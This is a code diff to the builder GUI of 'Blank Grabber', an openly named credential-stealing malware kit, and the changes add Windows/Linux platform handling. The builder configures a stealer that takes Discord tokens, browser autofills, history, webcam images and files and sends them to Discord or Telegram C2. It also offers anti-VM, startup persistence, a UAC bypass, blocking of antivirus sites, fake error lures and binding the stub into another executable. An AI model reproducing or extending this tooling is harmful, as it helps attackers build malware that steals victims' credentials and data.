@@ -2,7 +2,6 @@ import os
 import subprocess
 import sys
 import json
-import ctypes
 import shutil
 import ast
 import webbrowser
@@ -22,6 +21,13 @@ from PIL import Image
 from io import BytesIO
 from threading import Thread
 
+# Platform detection
+IS_WINDOWS = sys.platform == "win32"
+IS_LINUX = sys.platform.startswith("linux")
+
+if IS_WINDOWS:
+	import ctypes
+
 class Settings:
 	UpdatesCheck = True
 	Password = "blank123"
@@ -30,24 +36,29 @@ class Utility:
 
 	@staticmethod
 	def ToggleConsole(choice: bool) -> None:
-		if sys.platform == "win32":
-			if choice:
-				# Show Console
-				ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 4)
-			else:
-				# Hide Console
-				ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+		if IS_WINDOWS:
+			try:
+				import ctypes
+				if choice:
+					# Show Console
+					ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 4)
+				else:
+					# Hide Console
+					ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+			except Exception:
+				pass
 
 	@staticmethod
 	def IsAdmin() -> bool:
-		try:
-			if sys.platform == "win32":
+		if IS_WINDOWS:
+			try:
+				import ctypes
 				return ctypes.windll.shell32.IsUserAnAdmin() == 1
-			else:
-				# On Linux/Unix, check if running as root
-				return os.geteuid() == 0
-		except Exception:
-			return False
+			except Exception:
+				return False
+		elif IS_LINUX:
+			return os.geteuid() == 0
+		return False
 		
 	@staticmethod
 	def GetSelfDir() -> str:
@@ -60,6 +71,13 @@ class Utility:
 			return True
 		except Exception:
 			return False
+	
+	@staticmethod
+	def ClearScreen() -> None:
+		if IS_WINDOWS:
+			os.system("cls")
+		else:
+			os.system("clear")
 	
 	@staticmethod
 	def CheckForUpdates() -> bool:
@@ -75,17 +93,11 @@ class Utility:
 					_hash = json.loads(content)["hash"]
 					newhash = json.loads(http.request("GET", "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/Blank%20Grabber/Extras/hash", timeout= 5).data.decode())["hash"]
 
-					if sys.platform == "win32":
-						os.system("cls")
-					else:
-						os.system("clear")
+					Utility.ClearScreen()
 					return _hash != newhash # New update available
 				except Exception:
 					pass
-			if sys.platform == "win32":
-				os.system("cls")
-			else:
-				os.system("clear")
+			Utility.ClearScreen()
 		return False
 	
 	@staticmethod
@@ -154,7 +166,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.boundExeRunOnStartup = False
 		self.iconBytes = ""
 
-		self.OutputAsExe = True
+		self.OutputAsExe = IS_WINDOWS
 		self.ConsoleMode = 0 # 0 = None, 1 = Force, 2 = Debug
 		self.C2Mode = 0 # 0 = Discord, 1 = Telegram
 
@@ -178,13 +190,13 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.vmProtectCheckboxControl = ctk.CTkCheckBox(self, text= "Anti VM", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.vmProtectVar)
 		self.vmProtectCheckboxControl.grid(row= 2, column= 0, sticky= "w", padx= 20)
 
-		self.startupCheckboxControl = ctk.CTkCheckBox(self, text= "Put On Startup", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.startupVar)
+		self.startupCheckboxControl = ctk.CTkCheckBox(self, text= "Put On Startup", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.startupVar, state= "disabled" if IS_LINUX else "normal")
 		self.startupCheckboxControl.grid(row= 3, column= 0, sticky= "w", padx= 20)
 
-		self.meltCheckboxControl = ctk.CTkCheckBox(self, text= "Melt Stub", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.meltVar)
+		self.meltCheckboxControl = ctk.CTkCheckBox(self, text= "Melt Stub", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.meltVar, state= "disabled" if IS_LINUX else "normal")
 		self.meltCheckboxControl.grid(row= 4, column= 0, sticky= "w", padx= 20)
 
-		self.pumpStubCheckboxControl = ctk.CTkCheckBox(self, text= "Pump Stub", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", command= self.pumpStub_Event)
+		self.pumpStubCheckboxControl = ctk.CTkCheckBox(self, text= "Pump Stub", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", command= self.pumpStub_Event, state= "disabled" if IS_LINUX else "normal")
 		self.pumpStubCheckboxControl.grid(row= 5, column= 0, sticky= "w", padx= 20)
 
 		self.captureWebcamCheckboxControl = ctk.CTkCheckBox(self, text= "Webcam", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureWebcamVar)
@@ -199,8 +211,8 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.captureHistoryCheckboxControl = ctk.CTkCheckBox(self, text= "History", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureHistoryVar)
 		self.captureHistoryCheckboxControl.grid(row= 4, column= 1, sticky= "w", padx= 20)
 
-		self.captureHistoryCheckboxControl = ctk.CTkCheckBox(self, text= "Autofills", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureAutofillsVar)
-		self.captureHistoryCheckboxControl.grid(row= 5, column= 1, sticky= "w", padx= 20)
+		self.captureAutofillsCheckboxControl = ctk.CTkCheckBox(self, text= "Autofills", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureAutofillsVar)
+		self.captureAutofillsCheckboxControl.grid(row= 5, column= 1, sticky= "w", padx= 20)
 
 		self.captureDiscordTokensCheckboxControl = ctk.CTkCheckBox(self, text= "Discord Tokens", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureDiscordTokensVar)
 		self.captureDiscordTokensCheckboxControl.grid(row= 1, column= 2, sticky= "w", padx= 20)
@@ -226,28 +238,29 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.captureCommonFilesChecboxControl = ctk.CTkCheckBox(self, text= "Common Files", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureCommonFilesVar)
 		self.captureCommonFilesChecboxControl.grid(row= 4, column= 3, sticky= "w", padx= 20)
 
-		self.fakeErrorCheckboxControl = ctk.CTkCheckBox(self, text= "Fake Error", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", command= self.fakeError_Event)
+		self.fakeErrorCheckboxControl = ctk.CTkCheckBox(self, text= "Fake Error", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", command= self.fakeError_Event, state= "disabled" if IS_LINUX else "normal")
 		self.fakeErrorCheckboxControl.grid(row= 1, column= 4, sticky= "w", padx= 20)
 
-		self.blockAvSitesCheckboxControl = ctk.CTkCheckBox(self, text= "Block AV Sites", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.blockAvSitesVar)
+		self.blockAvSitesCheckboxControl = ctk.CTkCheckBox(self, text= "Block AV Sites", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.blockAvSitesVar, state= "disabled" if IS_LINUX else "normal")
 		self.blockAvSitesCheckboxControl.grid(row= 2, column= 4, sticky= "w", padx= 20)
 
-		self.discordInjectionCheckboxControl = ctk.CTkCheckBox(self, text= "Discord Injection", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.discordInjectionVar)
+		self.discordInjectionCheckboxControl = ctk.CTkCheckBox(self, text= "Discord Injection", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.discordInjectionVar, state= "disabled" if IS_LINUX else "normal")
 		self.discordInjectionCheckboxControl.grid(row= 3, column= 4, sticky= "w", padx= 20)
 
-		self.uacBypassCheckboxControl = ctk.CTkCheckBox(self, text= "UAC Bypass", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.uacBypassVar)
+		self.uacBypassCheckboxControl = ctk.CTkCheckBox(self, text= "UAC Bypass", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.uacBypassVar, state= "disabled" if IS_LINUX else "normal")
 		self.uacBypassCheckboxControl.grid(row= 4, column= 4, sticky= "w", padx= 20)
 
 		self.C2ModeButtonControl = ctk.CTkButton(self, text= "C2: Discord", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.C2ModeButtonControl_Callback)
 		self.C2ModeButtonControl.grid(row= 1, column= 5, sticky= "ew", padx= (0, 15))
 
-		self.bindExeButtonControl = ctk.CTkButton(self, text= "Bind Executable", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.bindExeButtonControl_Callback)
+		self.bindExeButtonControl = ctk.CTkButton(self, text= "Bind Executable", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.bindExeButtonControl_Callback, state= "disabled" if IS_LINUX else "normal")
 		self.bindExeButtonControl.grid(row= 2, column= 5, sticky= "ew", padx= (0, 15))
 
-		self.selectIconButtonControl = ctk.CTkButton(self, text= "Select Icon", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.selectIconButtonControl_Callback)
+		self.selectIconButtonControl = ctk.CTkButton(self, text= "Select Icon", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.selectIconButtonControl_Callback, state= "disabled" if IS_LINUX else "normal")
 		self.selectIconButtonControl.grid(row= 3, column= 5, sticky= "ew", padx= (0, 15))
 
-		self.buildModeButtonControl = ctk.CTkButton(self, text= "Output: EXE File", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.buildModeButtonControl_Callback)
+		output_text = "Output: EXE File" if IS_WINDOWS else "Output: PY File"
+		self.buildModeButtonControl = ctk.CTkButton(self, text= output_text, height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.buildModeButtonControl_Callback, state= "disabled" if IS_LINUX else "normal")
 		self.buildModeButtonControl.grid(row= 4, column= 5, sticky= "ew", padx= (0, 15))
 
 		self.consoleModeButtonControl = ctk.CTkButton(self, text= "Console: None", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.consoleModeButtonControl_Callback)
@@ -295,7 +308,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 		if buttonText == BIND:
 			allowedFiletypes = (("Executable file", "*.exe"),)
-			filePath = ctk.filedialog.askopenfilename(title= "Select file to bind", initialdir= ".", filetypes= allowedFiletypes)
+			filePath = filedialog.askopenfilename(title= "Select file to bind", initialdir= ".", filetypes= allowedFiletypes)
 			if os.path.isfile(filePath):
 				self.boundExePath = filePath
 				self.bindExeButtonControl.configure(text= UNBIND)
@@ -315,7 +328,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 		if buttonText == SELECT:
 			allowedFiletypes = (("Image", ["*.ico", "*.bmp", "*.gif", "*.jpeg", "*.png", "*.tiff", "*.webp"]), ("Any file", "*"))
-			filePath = ctk.filedialog.askopenfilename(title= "Select icon", initialdir= ".", filetypes= allowedFiletypes)
+			filePath = filedialog.askopenfilename(title= "Select icon", initialdir= ".", filetypes= allowedFiletypes)
 			if os.path.isfile(filePath):
 				try:
 					buffer = BytesIO()
@@ -524,7 +537,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 				try:
 					data = json.dumps({"content" : "Your webhook is working!"}).encode()
-					http = http.request("POST", webhook, body= data, headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Safari/537.36"})
+					http = http.request("POST", webhook, body= data, headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0"})
 					status = http.status
 					if status == 204:
 						messagebox.showinfo("Success", "Your webhook seems to be working!")
@@ -575,7 +588,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 						try:
 							resp = json.loads(http.request("GET", "https://api.telegram.org/bot%s/getChat?chat_id=%s" % (token, chat_id)).data.decode())
 							if not resp["ok"]:
-								messagebox.showerror("Error", "Invalid chat ID!\n\nCommon fixes:\n\n1) If the chat ID is of a user, then make sure the user have has sent at least one message to the bot.\n2) If the chat ID is of a group, the group id must be prefixed with a '-'.\n3) If the chat ID is of a private channel, the channel id must be prefixed with a '-100'.")
+								messagebox.showerror("Error", "Invalid chat ID!")
 								return
 							else:
 								if resp["result"].get("permissions"):
@@ -614,9 +627,13 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		if not self.fakeErrorVar.get():
 			self.fakeErrorData = [False, ("", "", 0)]
 		else:
-			fakeErrorBuilder = FakeErrorBuilder(self)
-			self.wait_window(fakeErrorBuilder)
-			self.fakeErrorVar.set(self.fakeErrorData[0])
+			if IS_WINDOWS:
+				fakeErrorBuilder = FakeErrorBuilder(self)
+				self.wait_window(fakeErrorBuilder)
+				self.fakeErrorVar.set(self.fakeErrorData[0])
+			else:
+				messagebox.showwarning("Warning", "Fake error is only available on Windows!")
+				self.fakeErrorVar.set(False)
 	
 	def pumpStub_Event(self) -> None:
 		if not self.pumpStubVar.get():
@@ -632,7 +649,10 @@ class PumperSettings(ctk.CTkToplevel):
 	def __init__(self, master) -> None:
 		super().__init__(master)
 		self.title("Blank Grabber [File Pumper]")
-		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
+		try:
+			self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
+		except:
+			pass
 		self.grab_set()
 		self.geometry("500x200")
 		self.resizable(False, False)
@@ -680,7 +700,10 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 	def __init__(self, master) -> None:
 		super().__init__(master)
 		self.title("Blank Grabber [Fake Error Builder]")
-		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
+		try:
+			self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
+		except:
+			pass
 		self.grab_set()
 		self.geometry("833x563")
 		self.resizable(True, False)
@@ -739,18 +762,9 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 			message= "Message"
 			self.messageEntry.insert(0, message)
 		
-		if sys.platform == "win32":
+		if IS_WINDOWS:
 			cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, icon)
 			subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-		else:
-			# Linux: Use zenity or notify-send
-			try:
-				subprocess.Popen(["notify-send", "-u", "critical", title, message])
-			except FileNotFoundError:
-				try:
-					subprocess.Popen(["zenity", "--error", "--title=" + title, "--text=" + message])
-				except FileNotFoundError:
-					messagebox.showinfo(title, message)
 	
 	def saveFakeError(self) -> None:
 		title= self.titleEntry.get().replace("\x22", "\\x22").replace("\x27", "\\x27")
@@ -763,19 +777,15 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 			self.destroy()
 
 		elif title.strip() == "":
-			if sys.platform == "win32":
+			if IS_WINDOWS:
 				cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Title cannot be empty', 0, 'Error', 0+16);close()"'''
 				subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-			else:
-				messagebox.showerror("Error", "Title cannot be empty!")
 			return
 		
 		elif message.strip() == "":
-			if sys.platform == "win32":
+			if IS_WINDOWS:
 				cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Message cannot be empty', 0, 'Error', 0+16);close()"'''
 				subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-			else:
-				messagebox.showerror("Error", "Message cannot be empty!")
 			return
 		
 		self.master.fakeErrorData = [True, (title, message, icon)]
@@ -788,7 +798,10 @@ class Builder(ctk.CTk):
 
 		ctk.set_appearance_mode("dark")
 		self.title("Blank Grabber [Builder]")
-		self.iconbitmap(os.path.join("Extras", "icon.ico"))
+		try:
+			self.iconbitmap(os.path.join("Extras", "icon.ico"))
+		except:
+			pass
 		self.geometry("1250x600")
 		self.resizable(False, False)
 
@@ -840,56 +853,52 @@ class Builder(ctk.CTk):
 		messagebox.showinfo("Success", "File saved as %r" % outPath)
 	
 	def BuildExecutable(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
+		if not IS_WINDOWS:
+			messagebox.showerror("Error", "EXE building is only available on Windows!")
+			return
+
 		def Exit(code: int = 0) -> None:
-			if sys.platform == "win32":
-				os.system("pause > NUL")
-			input("Press Enter to exit...")
+			os.system("pause > NUL")
 			exit(code)
 		
 		def clear() -> None:
-			if sys.platform == "win32":
-				os.system("cls")
-			else:
-				os.system("clear")
+			os.system("cls")
 		
 		def format(title: str, description: str) -> str:
 			return "[{}\u001b[0m] \u001b[37;1m{}\u001b[0m".format(title, description)
 		
 		self.destroy()
 		Utility.ToggleConsole(True)
-		
-		if sys.platform == "win32":
+		try:
+			import ctypes
 			ctypes.windll.user32.FlashWindow(ctypes.windll.kernel32.GetConsoleWindow(), True)
-		
+		except:
+			pass
 		clear()
 
-		if not os.path.isfile(os.path.join("env", "Scripts", "run.bat")) and not os.path.isfile(os.path.join("env", "bin", "run.sh")):
-			activate_script = "Scripts/activate" if sys.platform == "win32" else "bin/activate"
-			if not os.path.isfile(os.path.join("env", activate_script)):
+		env_scripts = os.path.join("env", "Scripts")
+		if not os.path.isfile(os.path.join(env_scripts, "run.bat")):
+			if not os.path.isfile(os.path.join(env_scripts, "activate")):
 				print(format("\u001b[33;1mINFO", "Creating virtual environment... (might take some time)"))
-				res = subprocess.run("python3 -m venv env" if sys.platform != "win32" else "python -m venv env", capture_output= True, shell= True)
+				res = subprocess.run("python -m venv env", capture_output= True, shell= True)
 				clear()
 				if res.returncode != 0:
-					print('Error while creating virtual environment: {}'.format(res.stderr.decode(errors= "ignore")))
+					print('Error while creating virtual environment ("python -m venv env"): {}'.format(res.stderr.decode(errors= "ignore")))
 					Exit(1)
 
 		print(format("\u001b[33;1mINFO", "Copying assets to virtual environment..."))
-		scripts_dir = "Scripts" if sys.platform == "win32" else "bin"
 		for i in os.listdir(datadir := os.path.join(os.path.dirname(__file__), "Components")):
 			if os.path.isfile(fileloc := os.path.join(datadir, i)):
-				shutil.copyfile(fileloc, os.path.join(os.path.dirname(__file__), "env", scripts_dir, i))
+				shutil.copyfile(fileloc, os.path.join(os.path.dirname(__file__), env_scripts, i))
 			else:
-				dest = os.path.join(os.path.dirname(__file__), "env", scripts_dir, i)
-				if os.path.exists(dest):
-					shutil.rmtree(dest)
-				shutil.copytree(fileloc, dest)
+				shutil.copytree(fileloc, os.path.join(os.path.dirname(__file__), env_scripts, i))
 
-		with open(os.path.join(os.path.dirname(__file__), "env", scripts_dir, "config.json"), "w", encoding= "utf-8", errors= "ignore") as file:
+		with open(os.path.join(os.path.dirname(__file__), env_scripts, "config.json"), "w", encoding= "utf-8", errors= "ignore") as file:
 			file.write(config)
 
 		clear()
 
-		os.chdir(os.path.join(os.path.dirname(__file__), "env", scripts_dir))
+		os.chdir(os.path.join(os.path.dirname(__file__), env_scripts))
 
 		if os.path.isfile("icon.ico"):
 			os.remove("icon.ico")
@@ -904,30 +913,42 @@ class Builder(ctk.CTk):
 		if os.path.isfile(boundFilePath):
 			shutil.copy(boundFilePath, "bound.exe")
 
-		if sys.platform == "win32":
+		try:
 			os.startfile("run.bat")
-		else:
-			subprocess.Popen(["bash", "run.sh"])
+		except:
+			subprocess.Popen(["cmd", "/c", "start", "run.bat"])
 
 if __name__ == "__main__":
 
-	if sys.platform == "win32":
+	if IS_WINDOWS:
 		if not os.path.isdir(os.path.join(os.path.dirname(__file__), "Components")):
-			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Components folder cannot be found. Please redownload the files!\', 10, \'Error\', 16);close()"', shell= True)
+			try:
+				import ctypes
+				subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Components folder cannot be found. Please redownload the files!\', 10, \'Error\', 16);close()"', shell= True)
+			except:
+				messagebox.showerror("Error", "Components folder cannot be found. Please redownload the files!")
 			exit(1)
 		
 		version = '.'.join([str(x) for x in (sys.version_info.major, sys.version_info.minor, sys.version_info.micro)])
-		if not (parse_version(version) > parse_version("3.10")):
-			subprocess.Popen(f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Your Python version is {version} but version 3.10+ is required. Please update your Python installation!\', 10, \'Error\', 16);close()"', shell= True)
+		if not (parse_version(version) >= parse_version("3.10")):
+			try:
+				import ctypes
+				subprocess.Popen(f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Your Python version is {version} but version 3.10+ is required. Please update your Python installation.\', 10, \'Error\', 16);close()"', shell= True)
+			except:
+				messagebox.showerror("Error", f"Your Python version is {version} but version 3.10+ is required.")
 			exit(1)
 		if "windowsapps" in sys.executable.lower():
-			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'It looks like you installed Python from Windows Store instead of using the official website https://www.python.org/downloads. The Windows Store version has limitations and we do not support it.\', 10, \'Error\', 16);close()"', shell= True)
+			try:
+				import ctypes
+				subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'It looks like you installed Python from Windows Store instead of using the official website https://www.python.org. Please uninstall it and reinstall from the official website.\', 10, \'Error\', 16);close()"', shell= True)
+			except:
+				messagebox.showerror("Error", "Please install Python from https://www.python.org instead of Windows Store.")
 			exit(1)
 
 		Utility.CheckConfiguration()
 		
 		if Utility.CheckForUpdates():
-			response = messagebox.askyesno("Update Checker", "A new version of the application is available. It is recommended that you update it to the latest version.\n\nDo you want to update the app? (Opens GitHub in your default browser)")
+			response = messagebox.askyesno("Update Checker", "A new version of the application is available. It is recommended that you update it to the latest version.\n\nDo you want to update the app? (Y/N)")
 			if response:
 				webbrowser.open_new_tab("https://github.com/Blank-c/Blank-Grabber")
 				exit(0)
@@ -936,19 +957,19 @@ if __name__ == "__main__":
 		# Utility.ToggleConsole(False)
 		
 		if not Utility.IsAdmin():
-			ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+			try:
+				import ctypes
+				ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+			except:
+				messagebox.showerror("Error", "This application requires administrator privileges!")
 			exit(0)
 		
 		Builder().mainloop()
 
-	else:
-		# Linux/Unix support
+	elif IS_LINUX:
 		Utility.CheckConfiguration()
-		
-		if Utility.CheckForUpdates():
-			response = messagebox.askyesno("Update Checker", "A new version of the application is available. It is recommended that you update it to the latest version.\n\nDo you want to update the app? (Opens GitHub in your default browser)")
-			if response:
-				webbrowser.open_new_tab("https://github.com/Blank-c/Blank-Grabber")
-				exit(0)
-		
 		Builder().mainloop()
+
+	else:
+		print("Only Windows and Linux are supported!")
+		
